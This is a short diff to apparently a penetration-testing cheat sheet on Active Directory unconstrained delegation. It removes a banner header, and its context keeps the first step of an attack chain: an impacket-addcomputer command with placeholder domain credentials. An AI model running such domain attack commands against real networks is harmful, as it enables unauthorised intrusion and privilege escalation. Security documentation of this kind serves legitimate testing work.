@@ -22,10 +22,6 @@ SeEnableDelegationPrivilege
 ### 2.4 Attack Chain
 
 ```powershell
-bash# ═══════════════════════════════════════════
-#   UNCONSTRAINED DELEGATION CHEAT SHEET
-# ═══════════════════════════════════════════
-
 # [1] Add computer account
 impacket-addcomputer -dc-ip <DC_IP> -computer-name <COMP_NAME> <DOMAIN>/<USER>:'<PASS>'
 
